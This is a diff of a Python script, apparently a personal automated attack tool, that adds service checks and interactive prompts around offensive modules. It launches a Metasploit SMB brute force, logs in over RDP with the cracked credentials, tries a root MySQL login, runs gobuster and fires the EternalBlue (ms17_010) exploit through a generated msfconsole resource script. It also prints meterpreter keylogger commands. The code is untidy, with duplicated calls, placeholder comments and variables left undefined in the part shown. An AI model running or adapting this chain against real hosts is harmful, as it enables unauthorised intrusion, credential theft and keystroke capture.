@@ -888,17 +888,202 @@ for port, info in services.items():
 
 
 
+def smb_conditions_met():
+    return is_port_open(445) and "445" in services and services["445"]["service"] in ["smb", "microsoft-ds"]
+
+def mysql_conditions_met():
+    return is_port_open(3306) and "3306" in services and services["3306"]["service"] == "mysql"
+
+
+
+
+
+#SMB
+
+
+if smb_conditions_met():
+    choice = input(
+        "\033[93m[?] SMB service detected.\n"
+        "Do you want to continue with SMB testing? (y/n): \033[0m"
+    ).strip().lower()
+
+    if choice in ["y", "yes"]:
+        print("\033[92m[*] SMB testing authorized by user.\033[0m")
+        # هنا فقط يتم استدعاء كود SMB (إن وجد)
+    else:
+        print("\033[91m[*] SMB testing skipped by user.\033[0m")
+else:
+    print("\033[94m[-] SMB conditions not met. Skipping SMB module.\033[0m")
+
+
+
+
+
+
+
+
+
+
+
+
+#MySQL
+
+
+if mysql_conditions_met():
+    choice = input(
+        "\033[93m[?] MySQL service detected.\n"
+        "Do you want to continue with MySQL testing? (y/n): \033[0m"
+    ).strip().lower()
+
+    if choice in ["y", "yes"]:
+        print("\033[92m[*] MySQL testing authorized by user.\033[0m")
+        # هنا فقط يتم استدعاء كود MySQL
+    else:
+        print("\033[91m[*] MySQL testing skipped by user.\033[0m")
+else:
+    print("\033[94m[-] MySQL conditions not met. Skipping MySQL module.\033[0m")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Brute Force SMB
+
+import os
+
+def smb_bruteforce_conditions_met():
+    if not is_port_open(445):
+        return False, "Port 445 is not open"
+
+    if "445" not in services:
+        return False, "SMB service not detected"
+
+    if services["445"]["service"] not in ["microsoft-ds", "netbios-ssn", "smb", "cifs"]:
+        return False, "Service is not SMB"
+
+
+    if "Windows" not in services["445"]["os"]:
+        return False, "Target OS is not Windows"
+
+    return True, "Conditions met"
+
+
+
+
+
+can_run, reason = smb_bruteforce_conditions_met()
+
+
+
+
+
+
+
+
+
+
+
+
+can_run, reason = smb_bruteforce_conditions_met()
+
+if not can_run:
+    print(f"\033[94m[-] SMB brute-force skipped: {reason}\033[0m")
+
+else:
+    choice = input(
+        "\n\033[93m[?] SMB conditions met.\n"
+        "Do you want to run SMB brute-force attack using Metasploit? (y/n): \033[0m"
+    ).strip().lower()
+
+    if choice in ["yes", "y"]:
+        print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")
+        # 👇 كود Metasploit كامل كما هو
+    else:
+        print("\033[92m[*] SMB brute-force skipped by user.\033[0m")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#RDP
+def rdp_conditions_met():
+    if not is_port_open(3389):
+        return False, "Port 3389 is not open"
+
+    if "3389" not in services:
+        return False, "RDP service not detected"
+
+    if services["3389"]["service"] not in ["ms-wbt-server", "rdp", "ssl/ms-wbt-server"]:
+        return False, "Service is not RDP"
+
+    if "Windows" not in services["3389"]["os"]:
+        return False, "Target OS is not Windows"
+
+    return True, "Conditions met"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+can_run, reason = smb_bruteforce_conditions_met()
+
 import subprocess
 import tempfile
 import re
+if not can_run:
+    print(f"\033[94m[-] SMB brute-force skipped: {reason}\033[0m")
+else:    
+ # الملفات الافتراضية
+ default_user_file = "/home/shams/Desktop/project/users.txt"
+ default_pass_file = "/home/shams/Desktop/project/password.txt"
 
-# الملفات الافتراضية
-default_user_file = "/home/shams/Desktop/project/users.txt"
-default_pass_file = "/home/shams/Desktop/project/password.txt"
+ choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()
 
-choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()
-
-if choice in ["yes", "y"]:
+ if choice in ["yes", "y"]:
     print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")
     
     # نسأل المستخدم عن مسار الملفات مع افتراضيات
@@ -954,30 +1139,54 @@ exit
             print(f"\033[93mPassword:\033[0m {PASSWORD}")
         else:
             print("\033[91m[-] No valid credentials found.\033[0m")
-else:
-    print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")
+
+    if FOUND_CREDS and match:
+     ok, reason = rdp_conditions_met()
+
+    if ok:
+        print("\033[92m[*] SMB brute-force succeeded. Credentials obtained.\033[0m")
+        print("\033[92m[*] Attempting RDP login...\033[0m")
+
+        choice = input(
+            "\033[94m[?] Do you want to proceed with the RDP login attempt? "
+            "(\033[92my\033[0m/\033[91mn\033[0m): "
+        ).strip().lower()
+
+        if choice == "y":
+            print("\033[92m[*] Executing RDP command...\033[0m")
+            os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
+        else:
+            print("\033[91m[!] RDP login attempt canceled by user.\033[0m")
+
+    else:
+        print(f"\033[94m[-] RDP skipped: {reason}\033[0m")
+
+ else:
+    # لا نجاح → لا RDP → لا رسالة نجاح
+    print("\033[91m[-] SMB brute-force failed. No valid credentials found.\033[0m")
 
 
 
 
 
 
+# ok, reason = rdp_conditions_met()
 
+# import os
 
+# print("\033[92m[*] We have successfully obtained the username and password.\033[0m")
+# print("\033[92m[*] Now we will attempt RDP login using rdesktop.\033[0m")
 
-import os
+# if ok:
+#  choice = input("\033[94m[?] Do you want to proceed with the RDP login attempt?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()
 
-print("\033[92m[*] We have successfully obtained the username and password.\033[0m")
-print("\033[92m[*] Now we will attempt RDP login using rdesktop.\033[0m")
-
-choice = input("\033[94m[?] Do you want to proceed with the RDP login attempt?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()
-
-if choice == "y":
-    print("\033[92m[*] Executing RDP command...\033[0m")
-    os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
-else:
-    print("\033[91m[!] RDP login attempt canceled.\033[0m")
-
+#  if choice == "y":
+#     print("\033[92m[*] Executing RDP command...\033[0m")
+#     os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
+#  else:
+#     print("\033[91m[!] RDP login attempt canceled.\033[0m")
+# else:
+#     print(f"\033[94m[-] RDP skipped: {reason}\033[0m")
 
 
 
@@ -1025,48 +1234,118 @@ else:
 
 
 
+#HTTP/HTTPS
+# def http_conditions_met(port):
+#     if not is_port_open(port):
+#         return False, f"Port {port} is not open"
+
+#     if str(port) not in services:
+#         return False, "HTTP service not detected"
+
+#     if services[str(port)]["service"] not in ["http", "https"]:
+#         return False, "Service is not HTTP"
+
+#     return True, "HTTP conditions met"
+
+
+
+# import subprocess
+
+# cyan = "\033[96m"
+# green = "\033[92m"
+# red = "\033[91m"
+# reset = "\033[0m"
+
+# DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
+
+# print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
+# choice = input("> ").strip().lower()
+
+# if choice in ["yes", "y"]:
+
+#     # Ask user for wordlist path
+#     wordlist = input(
+#         f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
+#     ).strip()
+
+#     # Use default if empty
+#     if not wordlist:
+#         wordlist = DEFAULT_WORDLIST
+
+#     print("Running the command...")
+
+#     command = [
+#         "gobuster",
+#         "dir",
+#         "-u", f"http://{TARGET_IP}/",
+#         "--wordlist", wordlist
+#     ]
+
+#     try:
+#         subprocess.run(command)
+#     except FileNotFoundError:
+#         print(f"{red}The command could not be executed. Make sure Gobuster is installed.{reset}")
+# else:
+#     print("Operation cancelled.")
 
 
 
 
-import subprocess
-
-cyan = "\033[96m"
+# ANSI color codes
+DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
+cyan  = "\033[96m"
 green = "\033[92m"
-red = "\033[91m"
+red   = "\033[91m"
+yellow = "\033[93m"
 reset = "\033[0m"
 
-DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
 
-print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
-choice = input("> ").strip().lower()
 
-if choice in ["yes", "y"]:
 
-    # Ask user for wordlist path
-    wordlist = input(
-        f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
-    ).strip()
+def http_conditions_met():
+    if "80" in services and services["80"]["service"] in ["http", "http-alt"]:
+        return True, "http"
+    if "443" in services and services["443"]["service"] in ["https", "ssl/http"]:
+        return True, "https"
+    return False, "No HTTP service detected"
 
-    # Use default if empty
-    if not wordlist:
-        wordlist = DEFAULT_WORDLIST
 
-    print("Running the command...")
+ok, protocol = http_conditions_met()
 
-    command = [
-        "gobuster",
-        "dir",
-        "-u", f"http://{TARGET_IP}/",
-        "--wordlist", wordlist
-    ]
-
-    try:
-        subprocess.run(command)
-    except FileNotFoundError:
-        print(f"{red}The command could not be executed. Make sure Gobuster is installed.{reset}")
+if not ok:
+    print(f"{cyan}[-] HTTP enumeration skipped: No HTTP service detected{reset}")
 else:
-    print("Operation cancelled.")
+    print(f"{cyan}[?] {protocol.upper()} service detected.{reset}")
+    choice = input(
+        f"{cyan}Do you want to run directory scanning? ({green}yes{reset}/{red}no{reset}): {reset}"
+    ).strip().lower()
+
+    if choice in ["yes", "y"]:
+
+        wordlist = input(
+            f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
+        ).strip()
+
+        if not wordlist:
+            wordlist = DEFAULT_WORDLIST
+
+        print(f"{green}[*] Starting directory scan using Gobuster...{reset}")
+
+        command = [
+            "gobuster",
+            "dir",
+            "-u", f"{protocol}://{TARGET_IP}/",
+            "-w", wordlist,
+            "-q"
+        ]
+
+        try:
+            subprocess.run(command)
+            print(f"{green}[+] Directory scan finished successfully.{reset}")
+        except FileNotFoundError:
+            print(f"{red}[-] Gobuster not found. Please install it first.{reset}")
+    else:
+        print(f"{cyan}[*] HTTP enumeration skipped by user.{reset}")
 
 
 
@@ -1082,29 +1361,69 @@ else:
 
 
 
+# can_run, reason = mysql_conditions_met()
 
+
+# import subprocess
+
+# def try_mysql_login():
+#     answer = input("\033[93mWould you like to connecting to the database server bypass exploit?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()
+
+#     if answer in ("y", "yes"):
+#         print("Running MySQL connection command...")
+#         subprocess.run([
+#     "mysql",
+#     "-u", "root",
+#     "-p",
+#     "-h", TARGET_IP,
+#     "--skip-ssl"
+#                        ])
+#         # subprocess.run(
+#         #     f"mysql -u root -p -h {TARGET_IP} --skip-ssl",
+#         #     shell=True
+#         # )
+#     else:
+#         print("Skipping database connection test.")
+# try_mysql_login()
+
+
+
+
+
+
+
+
+
+can_run = mysql_conditions_met()
 
 import subprocess
 
 def try_mysql_login():
-    answer = input("\033[93mWould you like to connecting to the database server bypass exploit?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()
+    print("\033[92m[*] MySQL service detected.\033[0m")
+
+    answer = input(
+        "\033[93mWould you like to attempt MySQL connection using root user?\033[0m "
+        "(\033[92my\033[0m/\033[91mn\033[0m): "
+    ).strip().lower()
 
     if answer in ("y", "yes"):
-        print("Running MySQL connection command...")
+        print("\033[92m[*] Running MySQL connection command...\033[0m")
         subprocess.run([
-    "mysql",
-    "-u", "root",
-    "-p",
-    "-h", TARGET_IP,
-    "--skip-ssl"
-                       ])
-        # subprocess.run(
-        #     f"mysql -u root -p -h {TARGET_IP} --skip-ssl",
-        #     shell=True
-        # )
+            "mysql",
+            "-u", "root",
+            "-p",
+            "-h", TARGET_IP,
+            "--skip-ssl"
+        ])
     else:
-        print("Skipping database connection test.")
-try_mysql_login()
+        print("\033[94m[*] MySQL connection skipped by user.\033[0m")
+
+
+# ===== Main Logic =====
+if can_run:
+    try_mysql_login()
+else:
+    print(f"\033[94m[-] MySQL skipped: \033[0m")
 
 
 
@@ -1112,12 +1431,28 @@ try_mysql_login()
 
 
 
-print(
-    "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
-    "\033[92mkeyscan_start\033[0m\n"
-    "\033[94mkeyscan_dump\033[0m\n"
-    "\033[91mkeyscan_stop\033[0m"
-)
+
+
+
+
+
+
+
+
+
+
+can_run = smb_conditions_met()
+
+
+
+# print(
+#     "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
+#     "\033[92mkeyscan_start\033[0m\n"
+#     "\033[94mkeyscan_dump\033[0m\n"
+#     "\033[91mkeyscan_stop\033[0m"
+# )
+
+
 
 
 
@@ -1125,13 +1460,21 @@ print(
 import subprocess
 import tempfile
 
-choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()
+if not can_run:
+    print(f"\033[94m[-] SMB exploit skipped:\033[0m")
+else:
+    print(
+    "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
+    "\033[92mkeyscan_start\033[0m\n"
+    "\033[94mkeyscan_dump\033[0m\n"
+    "\033[91mkeyscan_stop\033[0m"
+)
+    choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()
+    
+    if choice == "yes":
+        print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")
 
-if choice == "yes":
-    print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")
-
-   
-    msf_script = f"""
+        msf_script = f"""
 setg LHOST {LHOST}
 setg RHOSTS {TARGET_IP}
 use exploit/windows/smb/ms17_010_eternalblue
@@ -1139,15 +1482,68 @@ use exploit/windows/smb/ms17_010_eternalblue
 exploit
 """
 
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
-        f.write(msf_script)
-        script_path = f.name
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
+            f.write(msf_script)
+            script_path = f.name
+
+        subprocess.run(["msfconsole", "-q", "-r", script_path])
+
+    else:
+        print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# import subprocess
+# import tempfile
+
+
+
+# choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()
+
+# if choice == "yes":
+#     print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")
+
+   
+#     msf_script = f"""
+# setg LHOST {LHOST}
+# setg RHOSTS {TARGET_IP}
+# use exploit/windows/smb/ms17_010_eternalblue
+
+# exploit
+# """
+
+#     with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
+#         f.write(msf_script)
+#         script_path = f.name
 
     
-    subprocess.run(["msfconsole", "-q", "-r", script_path])
+#     subprocess.run(["msfconsole", "-q", "-r", script_path])
 
-else:
-    print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")
+# else:
+#     print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")
 
 
 
